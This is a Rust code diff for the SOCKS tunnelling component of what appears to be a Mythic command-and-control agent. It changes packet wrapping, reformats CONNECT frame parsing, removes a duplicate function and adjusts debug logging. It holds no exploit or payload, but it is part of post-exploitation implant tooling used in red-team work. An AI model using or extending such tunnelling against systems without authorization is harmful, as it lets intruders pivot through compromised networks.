@@ -67,7 +67,7 @@ fn build_reply(rep: u8, bound: Option<SocketAddr>) -> Vec<u8> {
 
 fn send_socks_packet(
     tx: &std_mpsc::Sender<serde_json::Value>,
-    _task_id: &str,              // no longer used in the envelope
+    task_id: &str,              // used by comms wrapper (post_response)
     server_id: &str,
     data: &[u8],
     exit: bool,
@@ -76,26 +76,17 @@ fn send_socks_packet(
         Ok(n) => serde_json::json!(n),
         Err(_) => serde_json::json!(server_id),
     };
-    // IMPORTANT: use the dedicated "socks" action, not post_response
+    // Emit a plain response object; comms will wrap in {"action":"post_response","responses":[...]}
     tx.send(serde_json::json!({
-        "action": "socks",
+        "task_id": task_id,
         "socks": [{
             "server_id": sid_json,
-            "data": base64::encode(data),
+            "data": encode(data),
             "exit": exit
         }]
     }))?;
     Ok(())
 }
-
-fn send_exit_only(
-    tx: &std_mpsc::Sender<serde_json::Value>,
-    task_id: &str,    // kept for callsite compatibility (unused here)
-    server_id: &str,
-) {
-    let _ = send_socks_packet(tx, task_id, server_id, &[], true);
-}
-
 
 fn send_exit_only(
     tx: &std_mpsc::Sender<serde_json::Value>,
@@ -130,27 +121,25 @@ fn parse_connect(decoded: &[u8]) -> Result<(String, u16), Box<dyn Error>> {
             let port = u16::from_be_bytes([decoded[8], decoded[9]]);
             Ok((ip.to_string(), port))
         }
-            0x03 => {
-                // DOMAIN
-                if decoded.len() < 5 {
-                    return Err("Malformed domain CONNECT frame (no length)".into());
-                }
-                let len = decoded[4] as usize;
-            
-                // >>> add this guard <<<
-                if len == 0 || len > 255 {
-                    return Err("Bad domain length".into());
-                }
-            
-                let need = 5 + len + 2;
-                if decoded.len() < need {
-                    return Err("Malformed domain CONNECT frame (truncated)".into());
-                }
-                let domain = std::str::from_utf8(&decoded[5..5 + len])?.to_string();
-                let port = u16::from_be_bytes([decoded[5 + len], decoded[6 + len]]);
-                Ok((domain, port))
+        0x03 => {
+            // DOMAIN
+            if decoded.len() < 5 {
+                return Err("Malformed domain CONNECT frame (no length)".into());
+            }
+            let len = decoded[4] as usize;
+
+            if len == 0 || len > 255 {
+                return Err("Bad domain length".into());
             }
 
+            let need = 5 + len + 2;
+            if decoded.len() < need {
+                return Err("Malformed domain CONNECT frame (truncated)".into());
+            }
+            let domain = std::str::from_utf8(&decoded[5..5 + len])?.to_string();
+            let port = u16::from_be_bytes([decoded[5 + len], decoded[6 + len]]);
+            Ok((domain, port))
+        }
         0x04 => {
             // IPv6
             let need = 4 + 16 + 2;
@@ -329,16 +318,20 @@ async fn run_session(
         }
     };
 
+    // Log the actual local bind for debug, but *reply* with IPv4 0.0.0.0:0
+    let bound_dbg = remote
+        .local_addr()
+        .ok()
+        .map(|s| s.to_string())
+        .unwrap_or_else(|| "unknown".into());
+
     let ok = build_reply(0x00, None); // replies as 0.0.0.0:0 (ATYP=IPv4)
     send_socks_packet(&tx_out, &parent_task_id, &server_id, &ok, false)?;
     debug_to_mythic(
         &tx_out,
         &parent_task_id,
         "connect.ok",
-        format!(
-            "server_id={server_id}; bound={}",
-            bound.map(|s| s.to_string()).unwrap_or_else(|| "unknown".into())
-        ),
+        format!("server_id={server_id}; bound={bound_dbg}"),
     );
 
     // Split TCP into halves
@@ -410,7 +403,6 @@ async fn run_session(
     debug_to_mythic(&tx_out, &parent_task_id, "session.end", format!("server_id={server_id}"));
     Ok(())
 }
-
 
 /* --------------------------------- Entry ---------------------------------- */
 
